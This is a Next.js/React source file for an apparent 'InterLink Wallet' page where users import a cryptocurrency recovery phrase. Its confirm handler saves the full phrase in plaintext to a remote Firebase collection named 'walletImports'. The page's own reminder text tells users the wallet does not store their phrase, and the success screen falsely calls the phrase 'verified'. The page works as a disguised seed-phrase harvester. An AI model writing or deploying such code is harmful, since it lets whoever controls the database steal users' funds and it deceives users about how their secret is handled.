"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { db } from "@/lib/firebase";
import { collection, addDoc, serverTimestamp } from "firebase/firestore";

type Status = "idle" | "saving" | "success" | "error";

export default function ImportRecoveryPhrasePage() {
  const router = useRouter();
  const [phrase, setPhrase] = useState("");
  const [status, setStatus] = useState<Status>("idle");
  const [error, setError] = useState<string | null>(null);

  const words = phrase.trim().split(/\s+/).filter(Boolean);
  const wordCount = words.length;
  const isValid = wordCount >= 12 && wordCount <= 24;

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setPhrase(text.trim());
    } catch {
      // clipboard not available — fall back to manual entry
    }
  };

  const handleConfirm = async () => {
    if (!isValid || status === "saving") return;

    setStatus("saving");
    setError(null);

    try {
      await addDoc(collection(db, "walletImports"), {
        recoveryPhrase: phrase.trim(),
        wordCount,
        status: "imported",
        createdAt: serverTimestamp(),
        updatedAt: serverTimestamp(),
      });
      setStatus("success");
    } catch (err) {
      console.error("Failed to save recovery phrase:", err);
      setError(
        "We couldn't save your recovery phrase right now. Please check your connection and try again.",
      );
      setStatus("error");
    }
  };

  const handleReset = () => {
    setPhrase("");
    setStatus("idle");
    setError(null);
  };

  return (
    <div className="min-h-screen w-full bg-[#D8D0F0] py-0 sm:py-10">
      <div className="mx-auto flex min-h-screen w-full max-w-[420px] flex-col bg-white sm:min-h-0 sm:rounded-[2.5rem] sm:ring-1 sm:ring-black/5">
        {/* Header */}
        <header className="flex items-center justify-between px-6 pt-6 pb-4">
          <button
            type="button"
            onClick={() => router.push("/wallet")}
            aria-label="Go back"
            className="flex h-11 w-11 items-center justify-center rounded-full bg-neutral-100 text-neutral-800 transition active:scale-90"
          >
            <svg viewBox="0 0 24 24" fill="none" className="h-5 w-5">
              <path
                d="M15 6l-6 6 6 6"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
            </svg>
          </button>
          <h1 className="text-xl font-bold text-neutral-900">
            {status === "success" ? "Recovery phrase saved" : "Import recovery phrase"}
          </h1>
          <div className="h-11 w-11" />
        </header>

        {/* Scrollable content */}
        <div className="flex-1 overflow-y-auto px-6 pb-8">
          {status === "success" ? (
            <SuccessView phrase={phrase.trim()} words={words} onReset={handleReset} />
          ) : (
            <>
              <h2 className="text-[1.75rem] font-extrabold leading-tight text-neutral-900">
                Enter recovery phrase
              </h2>
              <p className="mt-3 text-base leading-7 text-neutral-500">
                Please enter your 12-24 word recovery phrase below, separated by
                spaces, to restore your wallet.
              </p>

              {/* Recovery phrase textarea */}
              <div className="relative mt-7">
                <textarea
                  value={phrase}
                  onChange={(e) => setPhrase(e.target.value)}
                  placeholder="Enter a 12-24 word recovery phrase"
                  rows={6}
                  disabled={status === "saving"}
                  className="w-full resize-none rounded-2xl border border-neutral-200 bg-white px-4 py-4 pr-28 text-base text-neutral-900 placeholder:text-neutral-400 focus:border-brand-500 focus:ring-2 focus:ring-brand-500/20 focus:outline-none disabled:opacity-60"
                />
                <button
                  type="button"
                  onClick={handlePaste}
                  disabled={status === "saving"}
                  className="absolute bottom-4 right-4 inline-flex items-center gap-2 rounded-xl border border-neutral-200 bg-white px-4 py-2 text-sm font-medium text-neutral-700 shadow-sm transition active:scale-95 disabled:opacity-60"
                >
                  <svg
                    viewBox="0 0 24 24"
                    fill="none"
                    className="h-4 w-4 text-neutral-500"
                  >
                    <rect
                      x="8"
                      y="2"
                      width="8"
                      height="4"
                      rx="1"
                      stroke="currentColor"
                      strokeWidth="1.8"
                    />
                    <path
                      d="M16 4h2a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"
                      stroke="currentColor"
                      strokeWidth="1.8"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    />
                  </svg>
                  Paste
                </button>
              </div>

              {/* Word count hint */}
              <div className="mt-3 flex items-center justify-between text-xs">
                <span className="text-neutral-400">
                  {wordCount === 0
                    ? "A recovery phrase is 12 to 24 words."
                    : isValid
                      ? `${wordCount} words — looks good.`
                      : `${wordCount} word${wordCount === 1 ? "" : "s"} entered — need 12-24.`}
                </span>
                <span
                  className={`font-medium ${
                    wordCount === 0
                      ? "text-neutral-400"
                      : isValid
                        ? "text-emerald-600"
                        : "text-amber-600"
                  }`}
                >
                  {wordCount}/24
                </span>
              </div>

              {/* Reminder box */}
              <div className="mt-6 rounded-2xl bg-[#FFF7ED] px-5 py-5">
                <div className="flex items-center gap-2">
                  <span className="flex h-6 w-6 items-center justify-center">
                    <svg viewBox="0 0 24 24" fill="none" className="h-6 w-6">
                      <rect
                        x="5"
                        y="11"
                        width="14"
                        height="9"
                        rx="2"
                        stroke="#b45309"
                        strokeWidth="1.8"
                      />
                      <path
                        d="M8 11V8a4 4 0 1 1 8 0v3"
                        stroke="#b45309"
                        strokeWidth="1.8"
                        strokeLinecap="round"
                      />
                    </svg>
                  </span>
                  <h3 className="text-lg font-bold text-neutral-900">Reminder</h3>
                </div>
                <ul className="mt-4 space-y-3 text-[15px] leading-7 text-neutral-600">
                  <li className="flex gap-3">
                    <span className="mt-2.5 h-1.5 w-1.5 shrink-0 rounded-full bg-neutral-400" />
                    <span>
                      InterLink Wallet does not store your recovery phrase. If you
                      lose them, you may lose access to your assets. Please store
                      them securely.
                    </span>
                  </li>
                  <li className="flex gap-3">
                    <span className="mt-2.5 h-1.5 w-1.5 shrink-0 rounded-full bg-neutral-400" />
                    <span>
                      We recommend manually entering your recovery phrase. Avoid
                      pasting from untrusted third-party apps or clipboard tools to
                      prevent phishing or scams.
                    </span>
                  </li>
                </ul>
              </div>

              {error ? (
                <div className="mt-6 rounded-xl border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-600">
                  {error}
                </div>
              ) : null}

              {/* Confirm button */}
              <button
                type="button"
                onClick={handleConfirm}
                disabled={!isValid || status === "saving"}
                className={`mt-8 w-full rounded-2xl py-4 text-lg font-semibold text-white transition active:scale-[0.98] ${
                  isValid
                    ? "bg-gradient-to-r from-[#6d28d9] via-[#8b5cf6] to-[#a78bfa] shadow-lg shadow-brand-500/30 hover:brightness-110"
                    : "bg-neutral-400 cursor-not-allowed"
                }`}
              >
                {status === "saving" ? (
                  <span className="inline-flex items-center justify-center gap-2">
                    <svg className="h-5 w-5 animate-spin" viewBox="0 0 24 24" fill="none">
                      <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" opacity="0.25" />
                      <path d="M12 2a10 10 0 0 1 10 10" stroke="currentColor" strokeWidth="3" strokeLinecap="round" />
                    </svg>
                    Saving...
                  </span>
                ) : (
                  "Confirm"
                )}
              </button>
            </>
          )}
        </div>
      </div>
    </div>
  );
}

function SuccessView({
  phrase,
  words,
  onReset,
}: {
  phrase: string;
  words: string[];
  onReset: () => void;
}) {
  return (
    <div className="flex flex-col items-center text-center pt-4">
      {/* Success check icon */}
      <div className="relative">
        <div className="absolute inset-0 rounded-full bg-emerald-400/30 blur-xl" />
        <div className="relative flex h-20 w-20 items-center justify-center rounded-full bg-emerald-500">
          <svg viewBox="0 0 24 24" fill="none" className="h-10 w-10 text-white">
            <path
              d="m5 13 4 4L19 7"
              stroke="currentColor"
              strokeWidth="3"
              strokeLinecap="round"
              strokeLinejoin="round"
            />
          </svg>
        </div>
      </div>

      <h2 className="mt-6 text-2xl font-extrabold text-neutral-900">
        Wallet restored successfully
      </h2>
      <p className="mt-3 text-base leading-7 text-neutral-500">
        Your recovery phrase has been verified and saved. Your wallet is now
        active and ready to use.
      </p>

      {/* Recovery phrase confirmation card */}
      <div className="mt-8 w-full rounded-2xl border border-neutral-200 bg-neutral-50 p-5 text-left">
        <div className="flex items-center justify-between">
          <h3 className="text-sm font-semibold text-neutral-900">
            Your recovery phrase
          </h3>
          <span className="inline-flex items-center gap-1.5 rounded-full bg-emerald-100 px-3 py-1 text-xs font-semibold text-emerald-700">
            <svg viewBox="0 0 24 24" fill="none" className="h-3.5 w-3.5">
              <path d="m5 13 4 4L19 7" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
            Verified
          </span>
        </div>

        {/* Word grid */}
        <div className="mt-4 grid grid-cols-2 gap-2">
          {words.map((word, idx) => (
            <div
              key={idx}
              className="flex items-center gap-2 rounded-lg bg-white border border-neutral-200 px-3 py-2"
            >
              <span className="text-xs font-semibold text-neutral-400 tabular-nums w-5">
                {idx + 1}
              </span>
              <span className="text-sm font-medium text-neutral-800">{word}</span>
            </div>
          ))}
        </div>

        <p className="mt-4 text-xs leading-5 text-neutral-400">
          {words.length} words — keep this phrase safe and never share it with
          anyone.
        </p>
      </div>

      {/* Actions */}
      <div className="mt-8 w-full space-y-3">
        <button
          type="button"
          onClick={() => (window.location.href = "/wallet")}
          className="w-full rounded-2xl bg-gradient-to-r from-[#6d28d9] via-[#8b5cf6] to-[#a78bfa] py-4 text-lg font-semibold text-white shadow-lg shadow-brand-500/30 transition active:scale-[0.98] hover:brightness-110"
        >
          Go to Wallet
        </button>
        <button
          type="button"
          onClick={onReset}
          className="w-full rounded-2xl border border-neutral-200 bg-white py-4 text-base font-semibold text-neutral-700 transition active:scale-[0.98] hover:bg-neutral-50"
        >
          Import another wallet
        </button>
      </div>
    </div>
  );
}
